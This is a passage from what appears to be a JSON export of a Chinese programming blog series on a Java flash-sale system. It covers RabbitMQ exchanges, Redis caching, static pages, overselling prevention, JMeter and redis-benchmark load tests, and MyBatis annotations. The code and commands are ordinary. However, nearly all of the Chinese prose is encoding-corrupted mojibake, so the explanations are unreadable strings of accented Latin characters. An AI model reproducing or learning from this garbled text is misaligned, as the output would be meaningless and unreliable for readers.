ç¼–å†™æ¶ˆæ¯å‘é€è€…åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿° 5.3 ç¼–å†™æ¶ˆæ¯æ¥å—å™¨åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿° 5.4 æµ‹è¯•ç»“æœ æ ¹æ®æ¡ä»¶ï¼Œæˆ‘ä»¬å¯ä»¥çŸ¥é“Fanout Exchangeè¿›è¡Œå¹¿æ’­ï¼Œæ¯ä¸ªé˜Ÿåˆ—éƒ½ä¼šæ”¶åˆ°æ¶ˆæ¯ æµ‹è¯•å†…å®¹ æµ‹è¯•ç»“æœ 6. Headers Exchange ä»»ä½•å‘é€åˆ°Headers Exchangeçš„æ¶ˆæ¯ï¼Œéƒ½ä¼šå’Œå…¶ä¸­å­˜å‚¨çš„æ¡ä»¶è¿›è¡ŒåŒ¹é…ï¼Œæœ‰whereallå’ŒwhereAnyçš„åŒºåˆ«ï¼ˆå…¨éƒ¨åŒ¹é…/ä»»ä½•åŒ¹é…ï¼‰ 6.1 è¿›è¡Œé…ç½®åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿° 6.2 ç¼–å†™æ¶ˆæ¯å‘é€è€…åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿° 6.3 ç¼–å†™æ¶ˆæ¯æ¥æ”¶å™¨åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿° 6.4 æµ‹è¯•ç»“æœ æ ¹æ®åŒ¹é…æ¡ä»¶æˆ‘ä»¬å¯ä»¥çŸ¥é“ï¼Œåªæœ‰3é˜Ÿåˆ—èƒ½æ¥å—åˆ°æ¶ˆæ¯ã€‚ æµ‹è¯•å†…å®¹ æµ‹è¯•ç»“æœ","categories":[],"tags":[{"name":"project","slug":"project","permalink":"https://blog.kayleh.top/tags/project/"}]},{"title":"Javaé«˜æ€§èƒ½é«˜å¹¶å‘ç§’æ€ç³»ç»Ÿ(6)","slug":"Javaé«˜æ€§èƒ½é«˜å¹¶å‘ç§’æ€ç³»ç»Ÿ - å‰¯æœ¬ (5)","date":"2020-11-08T04:14:45.000Z","updated":"2021-04-15T15:25:46.351Z","comments":true,"path":"Javaé«˜æ€§èƒ½é«˜å¹¶å‘ç§’æ€ç³»ç»Ÿ - å‰¯æœ¬ (5)/","link":"","permalink":"https://blog.kayleh.top/Java%E9%AB%98%E6%80%A7%E8%83%BD%E9%AB%98%E5%B9%B6%E5%8F%91%E7%A7%92%E6%9D%80%E7%B3%BB%E7%BB%9F%20-%20%E5%89%AF%E6%9C%AC%20(5)/","excerpt":"","text":"1. é¡µé¢ç¼“å­˜ä¼˜åŒ–1.1 æœªç»ä¼˜åŒ–ä¹‹å‰çš„ä»£ç  @RequestMapping(&quot;/to_list&quot;) public String toList(Model model,MiaoShaUser user){ model.addAttribute(&quot;user&quot;,user); List&lt;GoodsVo&gt; goodsVos = goodsService.listGoodsVo(); model.addAttribute(&quot;goodsList&quot;,goodsVos); return &quot;goods_list&quot;; } 1234567 1.2 ä¼˜åŒ–äº§ç”Ÿçš„æ”¹å˜åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿° @RequestMapping(value = &quot;/to_list&quot;,produces = &quot;text/html&quot;) @ResponseBody public String toList(HttpServletRequest request, HttpServletResponse response, Model model, MiaoShaUser user){ model.addAttribute(&quot;user&quot;,user); //åœ¨æœ‰ç¼“å­˜çš„æƒ…å†µä¸‹ï¼Œå–å‡ºç¼“å­˜ String html = redisService.get(GoodsKey.goodsKeyPrefix, &quot;&quot;, String.class); if(! StringUtils.isEmpty(html)) return html; //åœ¨æ²¡æœ‰ç¼“å­˜çš„æ—¶å€™ï¼Œæ‰‹åŠ¨æ¸²æŸ“ï¼Œæ·»åŠ ç¼“å­˜ List&lt;GoodsVo&gt; goodsVos = goodsService.listGoodsVo(); model.addAttribute(&quot;goodsList&quot;,goodsVos); IWebContext ctx = new WebContext(request,response,request.getServletContext(),request.getLocale(),model.asMap()); html = thymeleafViewResolver.getTemplateEngine().process(&quot;goods_list&quot;,ctx);//è¿™é‡Œéœ€è¦æ³¨å…¥IContext if(!StringUtils.isEmpty(html)){ redisService.set(GoodsKey.goodsKeyPrefix,&quot;&quot;,html); } return html; //return &quot;goods_list&quot;; } é¦–å…ˆï¼Œæˆ‘ä»¬åº”ç”¨ç¼“å­˜ï¼Œä¸€å®šè¦å¼•å…¥RedisService @RequestMapping(value = â€œ/to_listâ€,produces = &quot;text/html&quot;)producesæ ‡æ³¨äº†è¿”å›å€¼çš„ç±»å‹ï¼Œå¿…é¡»ä¸@ResponseBodyæ­é…ä½¿ç”¨ æ‰‹åŠ¨æ¸²æŸ“è¿‡ç¨‹ä¸­ï¼Œæˆ‘ä»¬è¦æ³¨å…¥ThymeleafViewResolverï¼Œè¿™ä¸ªæ˜¯æ¡†æ¶ç»™æˆ‘ä»¬å‡†å¤‡å¥½çš„Beanï¼Œåˆ©ç”¨å®ƒæ¥æ¸²æŸ“é¡µé¢ï¼Œå…¶ä¸­ç¬¬äºŒä¸ªå‚æ•°ï¼Œéœ€è¦æ³¨å…¥IContext åœ¨Spring5ç‰ˆæœ¬ä¸­ï¼ŒSpringWebContextå·²ç»æ²¡æœ‰äº†ï¼Œæˆ‘ä»¬éœ€è¦ä½¿ç”¨WebContextæ¥ä»£æ›¿ã€‚å®ƒå‰”é™¤äº†ä¹‹å‰å¯¹ApplicationContext è¿‡å¤šçš„ä¾èµ–ï¼Œç°åœ¨thymeleafæ¸²æŸ“ä¸å†è¿‡å¤šä¾èµ–springå®¹å™¨ å†è€…ï¼Œæˆ‘ä»¬å¯¹Redisç¼“å­˜çš„æ—¶é—´è®¾ç½®äº†60ç§’çš„é™åˆ¶ï¼Œè¶…è¿‡60ç§’è¿‡æœŸï¼Œè¿™ä¸ªæ—¶é—´ä¸å®œè¿‡é•¿ã€‚åœ¨60ç§’å†…æˆ‘ä»¬çœ‹åˆ°çš„ç½‘é¡µä¸€ç›´ä¸€æ ·æ˜¯æš‚ä¸”å¯ä»¥æ¥å—çš„ 2. å¯¹è±¡ç¼“å­˜ä¸ç¼“å­˜æ›´æ–°2.1 å¯¹è±¡ç¼“å­˜å¯¹è±¡ç¼“å­˜ï¼Œæˆ‘ä»¬ä¹‹å‰å·²ç»åšè¿‡äº†ä¸€ä¸ªï¼Œå°±æ˜¯åœ¨MiaoshaServiceä¸­çš„getByTokenæ–¹æ³•ï¼Œé€šè¿‡tokenå€¼ï¼Œä»Redisä¸­è·å–å¯¹è±¡ä¿¡æ¯ã€‚è¿™æ¬¡ï¼Œæˆ‘ä»¬å®ç°ä¸€ä¸ªgetById()æ–¹æ³•ï¼Œå³é€šè¿‡Idå€¼ï¼Œä»Redisä¸­è·å–userå¯¹è±¡ã€‚ï¼ˆå¯¹è±¡ç¼“å­˜æ²¡æœ‰è®¾ç½®è¿‡æœŸæ—¶é—´ï¼Œè€Œä¸”å¯¹è±¡ç¼“å­˜æ˜¯ç²’åº¦æœ€å°çš„ç¼“å­˜ï¼‰ public MiaoShaUser getById(long id){ //å…ˆä»ç¼“å­˜ä¸­å– MiaoShaUser user = redisService.get(MiaoShaUserKey.idPrefix, &quot;&quot; + id, MiaoShaUser.class); if(user != null) return user; //ç¼“å­˜ä¸­æ²¡æœ‰ï¼Œä»æ•°æ®åº“ä¸­å–ï¼Œå¹¶ä¸”æŠŠå®ƒæ·»åŠ åˆ°ç¼“å­˜ä¸­ user = miaoShaUserDao.getById(id); if(user != null) redisService.set(MiaoShaUserKey.idPrefix,&quot;&quot; + id,user); return user; } 1234567891011 2.2 ç¼“å­˜æ›´æ–°æˆ‘ä»¬æ¨¡æ‹Ÿä¸€ä¸ªåœºæ™¯ï¼Œæˆ‘ä»¬è¦å¯¹å¯†ç è¿›è¡Œä¿®æ”¹ï¼Œé‚£ä¹ˆç¼“å­˜ä¹Ÿéœ€è¦ä¿®æ”¹ï¼Œç°åœ¨å…ˆåˆ—å‡ºè§†é¢‘ä¸­ç»™çš„æ–¹æ³•ï¼Œé€šè¿‡Idå€¼å–å‡ºç”¨æˆ·ï¼Œä¿®æ”¹æ•°æ®åº“ï¼Œä¹‹åï¼Œå¯¹token-userç¼“å­˜è¿›è¡Œä¿®æ”¹ï¼Œid-userç¼“å­˜è¿›è¡Œåˆ é™¤ public boolean updatePassword(long id,String formPass,String token){ //å–å‡ºuser MiaoShaUser user = getById(id); //æ²¡æœ‰è¿™ä¸ªç”¨æˆ· if(user == null) throw new GlobalException(CodeMsg.MOBILE_NOT_EXIST); //ä¿®æ”¹å¯†ç ï¼Œæ›´æ–°æ•°æ®åº“ user.setPassword(MD5Util.formPassToDBPass(formPass,user.getSalt())); miaoShaUserDao.update(user); //æ›´æ–°ç¼“å­˜,token-userç¼“å­˜ï¼ˆç™»é™†ç”¨çš„ï¼‰è¿™ä¸ªä¸èƒ½åˆ é™¤ï¼Œid-userç¼“å­˜åˆ é™¤ redisService.set(MiaoShaUserKey.getTokenPrefix,token,user); redisService.delete(MiaoShaUserKey.idPrefix,id); return true; } 123456789101112131415 ä¸ªäººç†è§£ï¼šæˆ‘ä»¬ä¸Šç½‘æ—¶çš„å¤šæ•°åœºæ™¯ï¼Œä¿®æ”¹å®Œå¯†ç ä¹‹åéƒ½è¦æˆ‘ä»¬è¿›è¡Œé‡æ–°ç™»å½•ï¼Œè€Œä¸”åœ¨æˆ‘ä»¬è¿™ä¸ªé¡¹ç›®ä¸­ï¼Œç™»å½•çš„è¿‡ç¨‹ä¸­ä¼šå¯¹token-userç¼“å­˜è¿›è¡Œé‡æ–°æ·»åŠ ï¼Œé‚£ä¹ˆæˆ‘ä»¬åœ¨ä¿®æ”¹å¯†ç çš„æ—¶å€™ï¼Œå¯ä»¥ç›´æ¥å°†token-userå’Œid-userå…¨éƒ¨éƒ½åˆ é™¤ï¼Œè€Œä¸éœ€è¦å¯¹å…¶ä¸­çš„ç¼“å­˜è¿›è¡Œå€¼çš„ä¿®æ”¹ã€‚ 3. é¡µé¢é™æ€åŒ–3.1 å°†å•†å“è¯¦æƒ…é¡µè¿›è¡Œé™æ€åŒ–å¤„ç†ï¼ˆè®¢å•è¯¦æƒ…ä¹Ÿåšäº†é™æ€åŒ–ï¼‰é€šå¸¸æƒ…å†µä¸‹ï¼Œé¡µé¢ä¸é‡‡ç”¨ç¬¬ä¸€ç§ç¼“å­˜çš„æ–¹å¼å®ç°ä¼˜åŒ–ï¼Œè€Œæ˜¯é€šè¿‡é™æ€åŒ–å¤„ç†ï¼Œæ¯”è¾ƒå¸¸ç”¨çš„æŠ€æœ¯æœ‰Vueã€‚é€šè¿‡é™æ€åŒ–å¤„ç†ï¼Œæˆ‘ä»¬å°†é¡µé¢ç¼“å­˜åœ¨å®¢æˆ·ç«¯æµè§ˆå™¨ä¸­ï¼Œä¸éœ€è¦ä¸æœåŠ¡å™¨äº¤äº’å°±èƒ½è®¿é—®åˆ°é¡µé¢ã€‚ ä»¥ä¸‹ï¼Œæˆ‘ä»¬ç”¨JQueryå®ç°ã€‚ 3.1.1 å¯¹åç«¯ä»£ç è¿›è¡Œå¤„ç† @RequestMapping(value = &quot;/detail/{goodsId}&quot;) @ResponseBody public Result&lt;GoodsDetailVo&gt; toDetail(HttpServletRequest request, HttpServletResponse response, Model model, MiaoShaUser user, @PathVariable(&quot;goodsId&quot;) long goodsId){ GoodsVo goodsVo = goodsService.getGoodsVoByGoodsId(goodsId); //ç§’æ€å¼€å§‹ã€ç»“æŸæ—¶é—´ï¼Œå½“å‰æ—¶é—´ long startDate = goodsVo.getStartDate().getTime(); long endDate = goodsVo.getEndDate().getTime(); long now = System.currentTimeMillis(); //ç§’æ€çŠ¶æ€ï¼Œ0ä¸ºæ²¡å¼€å§‹ï¼Œ1ä¸ºæ­£åœ¨è¿›è¡Œï¼Œ2ä¸ºç§’æ€å·²ç»ç»“æŸ int miaoshaStatus = 0; //è·ç¦»ç§’æ€å‰©ä½™çš„æ—¶é—´ int remainSeconds = 0; if(now &lt; startDate){ //ç§’æ€æ²¡å¼€å§‹ï¼Œè¿›è¡Œå€’è®¡æ—¶ remainSeconds = (int) (startDate - now) / 1000; }else if(now &gt; endDate){ //ç§’æ€å·²ç»ç»“æŸ miaoshaStatus = 2; remainSeconds = -1; }else { //ç§’æ€è¿›è¡Œæ—¶ remainSeconds = 0; miaoshaStatus = 1; } GoodsDetailVo goodsDetailVo = new GoodsDetailVo(); goodsDetailVo.setGoods(goodsVo); goodsDetailVo.setUser(user); goodsDetailVo.setMiaoshaStatus(miaoshaStatus); goodsDetailVo.setRemainSeconds(remainSeconds); return Result.success(goodsDetailVo); } 123456789101112131415161718192021222324252627282930313233343536 @RequestMappingä¸­ï¼Œå»æ‰produceså±æ€§ å»æ‰Modelå‘å‰ç«¯ä¼ å€¼çš„é€»è¾‘ï¼Œåªç•™ä¸‹ä¸šåŠ¡å¤„ç†è¿‡ç¨‹ï¼Œå¹¶å°†æ‰€éœ€è¦çš„çš„å€¼å°è£…åœ¨GoodsDetailVoå¯¹è±¡ä¸­ æ³¨æ„äº‹é¡¹åœ¨GoodsDetailVoä¸­çš„å±æ€§å­—æ®µè¦ä¸å‰ç«¯æ‰€éœ€è¦çš„å­—æ®µåä¿æŒä¸€è‡´ï¼Œå¦‚ä¸‹æ‰€ç¤ºï¼Œè¿™æ ·æ‰èƒ½è·å– @Data public class GoodsDetailVo { private long miaoshaStatus; private long remainSeconds; private GoodsVo goods; private MiaoShaUser user; } 12345678 å¯¹åº”å‰ç«¯ 3.1.2 å¯¹å‰ç«¯è·³è½¬çš„ä¿®æ”¹æˆ‘ä»¬ä»å•†å“åˆ—è¡¨é¡µé¢è·³è½¬åˆ°å•†å“è¯¦æƒ…é¡µï¼Œä¿®æ”¹ä¸ºå¦‚ä¸‹æ³¨æ„å…¶ä¸­/goods_detail.htmï¼Œå®ƒæ˜¯æ”¾åœ¨staticç›®å½•ä¸‹çš„é™æ€èµ„æºï¼Œä¸ºäº†é˜²æ­¢è§†å›¾è§£æå™¨çš„è·³è½¬ï¼Œå°†htmlå†™ä¸ºhtm 3.1.3 åœ¨application.propertiesä¸­é…ç½®# static spring.resources.add-mappings=true spring.resources.cache.period= 3600 #ç¼“å­˜æ—¶é—´ spring.resources.chain.cache=true spring.resources.chain.enabled=true #spring.resources.chain.gzipped=true spring.resources.chain.html-application-cache=true spring.resources.static-locations=classpath:/static/ 12345678 4. POSTè¯·æ±‚å’ŒGETè¯·æ±‚çš„åŒºåˆ« GETï¼šè¿™ä¸ªè¯·æ±‚æ˜¯å¹‚ç­‰çš„ï¼Œä»æœåŠ¡ç«¯è·å–æ•°æ®ï¼Œåå¤è·å–ä¸ä¼šå¯¹æ•°æ®æœ‰å½±å“ã€‚å› ä¸ºGETå› ä¸ºæ˜¯è¯»å–ï¼Œå°±å¯ä»¥å¯¹GETè¯·æ±‚çš„æ•°æ®åšç¼“å­˜ã€‚è¿™ä¸ªç¼“å­˜å¯ä»¥åšåˆ°æµè§ˆå™¨æœ¬èº«ä¸Šï¼ˆå½»åº•é¿å…æµè§ˆå™¨å‘è¯·æ±‚ï¼‰ï¼Œä¹Ÿå¯ä»¥åšåˆ°ä»£ç†ä¸Šï¼ˆå¦‚nginxï¼‰ï¼Œæˆ–è€…åšåˆ°serverç«¯ï¼ˆç”¨Etagï¼Œè‡³å°‘å¯ä»¥å‡å°‘å¸¦å®½æ¶ˆè€—ï¼‰ POSTï¼šè¯¥è¯·æ±‚æ˜¯ä¸å¹‚ç­‰çš„ï¼Œå®ƒä¼šåœ¨é¡µé¢è¡¨å•ä¸Šæäº¤æ•°æ®ï¼Œè¯·æ±‚æœåŠ¡å™¨çš„å“åº”ï¼Œå¾€å¾€ä¼šå¯¹æ•°æ®è¿›è¡Œä¿®æ”¹ 5. è§£å†³è¶…å–é—®é¢˜ å½“å¤šä¸ªçº¿ç¨‹åŒæ—¶è¯»å–åˆ°åŒä¸€ä¸ªåº“å­˜æ•°é‡æ—¶ï¼Œé˜²æ­¢è¶…å–ï¼Œä¿®æ”¹SQLè¯­å¥ #æ·»åŠ stock_count &gt; 0çš„æ¡ä»¶ update miaosha_goods set stock_count = stock_count - 1 where goods_id = #{goodsId} and stock_count &gt; 0 12 é˜²æ­¢åŒä¸€ä¸ªç”¨æˆ·ç§’æ€å¤šä¸ªï¼Œæ·»åŠ å”¯ä¸€ç´¢å¼•ï¼Œç»‘å®šuser_idå’Œgoods_idï¼Œè¿™æ ·åŒä¸€ä¸ªç”¨æˆ·å¯¹åŒä¸€ä¸ªå•†å“çš„ç§’æ€è®¢å•æ˜¯å”¯ä¸€çš„ åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°","categories":[],"tags":[{"name":"project","slug":"project","permalink":"https://blog.kayleh.top/tags/project/"}]},{"title":"Javaé«˜æ€§èƒ½é«˜å¹¶å‘ç§’æ€ç³»ç»Ÿ(5)","slug":"Javaé«˜æ€§èƒ½é«˜å¹¶å‘ç§’æ€ç³»ç»Ÿ - å‰¯æœ¬ (4)","date":"2020-11-08T04:12:45.000Z","updated":"2021-04-15T15:25:50.462Z","comments":true,"path":"Javaé«˜æ€§èƒ½é«˜å¹¶å‘ç§’æ€ç³»ç»Ÿ - å‰¯æœ¬ (4)/","link":"","permalink":"https://blog.kayleh.top/Java%E9%AB%98%E6%80%A7%E8%83%BD%E9%AB%98%E5%B9%B6%E5%8F%91%E7%A7%92%E6%9D%80%E7%B3%BB%E7%BB%9F%20-%20%E5%89%AF%E6%9C%AC%20(4)/","excerpt":"","text":"1. JMeterå‹åŠ›æµ‹è¯•1.1 æµ‹è¯•è¿‡ç¨‹ æ‰“å¼€jmeter.bat è®¾ç½®HTTPé»˜è®¤è¯·æ±‚ç¼–å†™åè®®å’Œç«¯å£å· ç¼–å†™æµ‹è¯•HTTPè¯·æ±‚å› ä¸ºæˆ‘ä»¬å·²ç»å†™è¿‡é»˜è®¤è®¾ç½®ï¼Œæˆ‘ä»¬å°±å¯ä»¥ä¸ç”¨ç¼–å†™åè®®å’Œåœ°å€äº†ï¼Œå¦‚ä¸‹ï¼Œåªéœ€ç¼–å†™è¯·æ±‚ç±»å‹å’Œåœ°å€å³å¯ æ·»åŠ èšåˆæŠ¥å‘Š æˆ‘ä»¬å³å¯åœ¨æŠ¥å‘Šä¸­æŸ¥çœ‹å‹æµ‹ä¿¡æ¯ 1.2 Linux topå‘½ä»¤ topï¼šç›¸å½“äºWindowsä¸‹çš„ä»»åŠ¡ç®¡ç†å™¨ï¼Œå¯ä»¥åŠ¨æ€æ˜¾ç¤ºå½“å‰è¿›ç¨‹çš„çŠ¶å†µ 2. è‡ªå®šä¹‰é…ç½®æ–‡ä»¶JMeterå‹æµ‹2.1 æµ‹è¯•è¿‡ç¨‹ä¸ä¸Šæ–¹åŸºæœ¬ä¸€è‡´ï¼Œä¸è¿‡ï¼Œè¦åœ¨æµ‹è¯•çš„è¯·æ±‚ä¸Šï¼Œæ·»åŠ CSVæ•°æ®æ–‡ä»¶è®¾ç½®è¯»å–æˆ‘ä»¬è‡ªå·±ç¼–å†™çš„é…ç½®æ–‡ä»¶ï¼Œå¹¶ä¸”æ ‡æ³¨å˜é‡åç§°ï¼Œå¦‚æ­¤ï¼Œå³å¯å¼€å§‹å‹æµ‹ã€‚å…¶ä¸­é…ç½®æ–‡ä»¶ä¿¡æ¯ï¼Œç”¨è‹±æ–‡é€—å·éš”å¼€ 3. Rediså‹æµ‹#100ä¸ªå¹¶å‘è¿æ¥ï¼Œ100000ä¸ªè¯·æ±‚ redis-benchmark -h 127.0.0.1 -p 6379 -c 100 -n 100000 #å­˜å–å¤§å°ä¸º100å­—èŠ‚çš„æ•°æ®åŒ… redis-benchmark -h 127.0.0.1 -p 6379 -q -d 100 #æµ‹è¯•setå’Œlpushå‘½ä»¤çš„QPSï¼Œå…¶ä¸­-qä¸ºç®€åŒ–è¾“å‡º redis-benchmark -t set,lpush -q -n 1000000 #æµ‹è¯•å•æ¡å‘½ä»¤çš„QPS redis-benchmark -n 100000 -q script load &quot;redis.call(&#39;set&#39;,&#39;foo&#39;,&#39;bar&#39;)&quot; 1234567891011 4. Linuxç¯å¢ƒä¸‹ï¼Œå‘½ä»¤è¡Œå‹æµ‹ åœ¨Windowsç›®å½•ä¸‹å†™å¥½jmxæ–‡ä»¶ å‘½ä»¤è¡Œï¼šsh jmeter.sh -n -t xxx.jmx -l result.jtl å†å°†result.jtlå¯¼å…¥åˆ°jmeterä¸­ 4.1 æ‰“æˆjaråŒ…maven clean package 1 æ‰“å¼€jaråŒ…ï¼Œæˆ‘ä»¬è¿›å…¥META-INFç›®å½•ä¸‹ï¼Œæ‰“å¼€MANIFEST.MFæ–‡ä»¶ï¼Œæˆ‘ä»¬å¯ä»¥å‘ç°å¦‚ä¸‹è¯­å¥å…¶ä¸­Main-Classä¸ºSpringBootæ¡†æ¶çš„å¯åŠ¨ç±»ï¼Œåœ¨è¿™ä¸ªç±»ä¸­å¯ä»¥è·Ÿè¿›çœ‹æºç Start-Classä¸ºæˆ‘ä»¬è‡ªå·±ç¼–å†™çš„å¯åŠ¨ç±» 4.2 ä¸Šä¼ åˆ°LinuxæœåŠ¡å™¨ä¸Š#æ‰§è¡Œå¦‚ä¸‹å‘½ä»¤ï¼Œä¹‹åå³å¯æ ¹æ®å¦‚ä¸‹åœ°å€è®¿é—® #http://182.92.xxx.xxx:8080/login java -jar miaosha.jar 123 4.3 ç¼–å†™.jmxæ–‡ä»¶åœ¨Windowsä¸Šç”¨JMeterç¼–å†™.jmxè„šæœ¬ï¼Œä¸Šä¼ åˆ°æœåŠ¡å™¨ä¸Šï¼Œæ‰§è¡Œå¦‚ä¸‹å‘½ä»¤è¡Œ jmeter.sh -n -t good_list.jmx -l result.jtl 1 ä¹‹åï¼Œä¸‹è½½result.jtlåˆ°Windowsæœ¬åœ°ï¼Œè¿›è¡ŒæŠ¥å‘Šåˆ†æ 5. SpringBoot æ‰“waråŒ… åœ¨pom.xmlæ–‡ä»¶ä¸­ï¼Œæ·»åŠ æ‰“åŒ…ä¸ºwaråŒ…çš„æ ‡ç­¾ &lt;packaging&gt;war&lt;/packaging&gt; 1 æ·»åŠ tomcat providedç¼–è¯‘æ—¶çš„ä¾èµ– &lt;dependency&gt; &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt; &lt;artifactId&gt;spring-boot-starter-tomcat&lt;/artifactId&gt; &lt;scope&gt;provided&lt;/scope&gt; &lt;/dependency&gt; 12345 åœ¨ä¸»ç±»ä¸­ï¼Œå®ç°SpringBootServletInitializerï¼Œé‡å†™configure()æ–¹æ³• @SpringBootApplication public class MiaoshaApplication extends SpringBootServletInitializer { public static void main(String[] args) { SpringApplication.run(MiaoshaApplication.class, args); } @Override protected SpringApplicationBuilder configure(SpringApplicationBuilder builder) { return builder.sources(MiaoshaApplication.class); } } 123456789101112 å°†ROOTç›®å½•åˆ é™¤ï¼Œå¹¶ä¸”æŠŠæˆ‘ä»¬çš„waråŒ…ä¿®æ”¹ä¸ºROOT.warï¼Œæ”¾åœ¨webappsç›®å½•ä¸‹ï¼Œå³å¯è®¿é—®","categories":[],"tags":[{"name":"project","slug":"project","permalink":"https://blog.kayleh.top/tags/project/"}]},{"title":"Javaé«˜æ€§èƒ½é«˜å¹¶å‘ç§’æ€ç³»ç»Ÿ(4)","slug":"Javaé«˜æ€§èƒ½é«˜å¹¶å‘ç§’æ€ç³»ç»Ÿ - å‰¯æœ¬ (3)","date":"2020-11-07T04:13:45.000Z","updated":"2021-04-15T15:25:53.522Z","comments":true,"path":"Javaé«˜æ€§èƒ½é«˜å¹¶å‘ç§’æ€ç³»ç»Ÿ - å‰¯æœ¬ (3)/","link":"","permalink":"https://blog.kayleh.top/Java%E9%AB%98%E6%80%A7%E8%83%BD%E9%AB%98%E5%B9%B6%E5%8F%91%E7%A7%92%E6%9D%80%E7%B3%BB%E7%BB%9F%20-%20%E5%89%AF%E6%9C%AC%20(3)/","excerpt":"","text":"1. å®ç°è”è¡¨æŸ¥è¯¢çš„ä¸€ä¸ªå°æŠ€å·§å•†å“è¡¨å’Œç§’æ€å•†å“è¡¨æ˜¯ä¸¤ä¸ªäº’ç›¸ç‹¬ç«‹çš„è¡¨ï¼Œå…¶ä¸­çš„å…³è”ä¸ºgoods_idï¼Œä½†æ˜¯æˆ‘è¦è¿”å›çš„å¯¹è±¡ï¼Œæ—¢æƒ³è¦å•†å“è¡¨ä¸­çš„å­—æ®µï¼Œåˆæƒ³è¦ç§’æ€å•†å“è¡¨ä¸­çš„å­—æ®µï¼Œç”¨ä¸‹é¢è¿™ä¸ªæ–¹æ³•ï¼Œæœ‰ç‚¹å„¿äº®çœ¼ @Data public class GoodsVo extends Goods { private Double miaoshaPrice; private Integer stockCount; private Date startDate; private Date endDate; } 1234567 åˆ›å»ºä¸€ä¸ªGoodsVoç±»ï¼Œç»§æ‰¿Goodsç±»ï¼Œå†å°†ç§’æ€å•†å“è¡¨ä¸­ç‰¹æœ‰çš„å­—æ®µï¼Œæ·»åŠ è¿›å»å³å¯ 1.1 å·¦è”è¡¨æŸ¥è¯¢SQLè¯­å¥ æŸ¥è¯¢æ‰€æœ‰çš„å•†å“ @Select(&quot;select g.*,mg.stock_count,mg.miaosha_price,mg.start_date,mg.end_date from miaosha_goods mg left join goods g on mg.goods_id = g.id&quot;) public List&lt;GoodsVo&gt; listGoodsVo(); 12 æ ¹æ®idè·å–å•†å“ @Select(&quot;select g.*,mg.stock_count,mg.miaosha_price,mg.start_date,mg.end_date from miaosha_goods mg left join goods g on mg.goods_id = g.id where mg.goods_id = #{goodId}&quot;) public GoodsVo getGoodsVoByGoodsId(@Param(&quot;goodId&quot;)long goodId); 12 1.2 Druidæ•°æ®åº“è¿æ¥æ± ä¸­urlåœ°å€çš„å†™æ³•jdbc:mysql://xxx.xx.xxx.xxx:3306/miaosha?useUnicode=true&amp;characterEncoding=utf-8&amp;allowMultiQueries=true&amp;useSSL=false&amp;useTimezone=true&amp;serverTimezone=GMT%2B8 1 serverTimezone=GMT%2B8:æ—¶åŒºä¸ºGMT%2B8 2. å•†å“è¯¦æƒ…é¡µå¯¹RestFulé£æ ¼çš„ä½¿ç”¨ @RequestMapping(&quot;to_detail/{goodsId}&quot;) public String toDetail(Model model, MiaoShaUser user, @PathVariable(&quot;goodsId&quot;) long goodsId){ ... } 1234 @RequestMappingæŒ‡å®šçš„æ˜ å°„URLï¼Œå…¶ä¸­æœ‰ç”¨{}æ‹¬èµ·æ¥çš„å‚æ•°ï¼Œåœ¨æ–¹æ³•çš„å½¢å‚å¤„ï¼Œç”¨@PathVariableæ³¨è§£å¯¹å…¶è¿›è¡Œè·å– 3. ç§’æ€åŠŸèƒ½å®ç°çš„é€»è¾‘åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿° 3.1 å‡å°‘åº“å­˜çš„sqlè¯­å¥ @Update(&quot;update miaosha_goods set stock_count = stock_count - 1 where goods_id = #{goodsId}&quot;) void reduceStock(MiaoshaGoods miaoshaGoods); 12 3.2 åˆ›å»ºè®¢å•çš„sqlè¯­å¥ @Insert(&quot;insert into order_info (user_id,goods_id,goods_name,goods_count,goods_price,order_channel,status,create_date)&quot; + &quot;values(#{userId},#{goodsId},#{goodsName},#{goodsCount},#{goodsPrice},#{orderChannel},#{status},#{createDate})&quot; ) @SelectKey(statement = &quot;select last_insert_id()&quot;,keyProperty = &quot;id&quot;,resultType = long.class,before = false) long insert(OrderInfo orderInfo); 1234 3.3 @SelectKey()æ³¨è§£ éœ€è¦å‰ç½®æ³¨è§£ï¼š@Insert æˆ– @InsertProvider æˆ– @Update æˆ– @UpdateProviderï¼Œå¦åˆ™æ— æ•ˆã€‚ statementï¼šå¡«å…¥å°†ä¼šè¢«æ‰§è¡Œçš„ SQL å­—ç¬¦ä¸² keyPropertyå±æ€§ï¼šå¡«å…¥å°†ä¼šè¢«æ›´æ–°çš„å‚æ•°å¯¹è±¡çš„å±æ€§ beforeå±æ€§ï¼šå¡«å…¥ true æˆ– false ä»¥æŒ‡æ˜ SQL è¯­å¥åº”è¢«åœ¨æ’å…¥è¯­å¥çš„ä¹‹å‰è¿˜æ˜¯ä¹‹åæ‰§è¡Œ resultTypeå±æ€§ï¼šå¡«å…¥ keyProperty çš„ Java ç±»å‹ 3.3.1 è·å–ä¸»é”®å€¼çš„æ³¨æ„äº‹é¡¹å¯èƒ½æˆ‘ä»¬åœ¨æ‰§è¡Œå®Œæ’å…¥æ–¹æ³•åï¼Œæƒ³å¦‚ä¸‹è¿™æ ·é€šè¿‡è·å–è¿”å›å€¼çš„æ–¹æ³•æ¥è·å–ä¸»é”®idå€¼ long orderId = orderDao.insert(orderInfo) 1 ç„¶è€Œå¹¶ä¸æ˜¯è¿™æ ·ï¼Œå› ä¸ºæ‰§è¡Œæ’å…¥sqlè¯­å¥è¿”å›å€¼åªæœ‰ä¸¤ç§æƒ…å†µï¼Œä¸€ç§æ˜¯æ’å…¥æˆåŠŸè¿”å›1ï¼Œå¦ä¸€ç§æ˜¯æ’å…¥å¤±è´¥ï¼Œè¿”å›0ï¼Œæ‰€ä»¥è‹¥è¿™é‡Œå‡ºç°ä¸€ç›´è·å–åˆ°1å€¼çš„é—®é¢˜ï¼Œç”¨å¦‚ä¸‹æ–¹æ³•è§£å†³ orderInfo.getId(); 1 å› ä¸ºï¼Œ@SelectKey()ä¼šå°†å€¼ç›´æ¥æ˜ å°„åˆ°å®ä½“ç±»çš„å±æ€§ä¸Šè¿›è¡Œä¿®æ”¹ï¼Œè¦æƒ³è·å–ä¸»é”®å€¼ï¼Œåªèƒ½è¿™æ 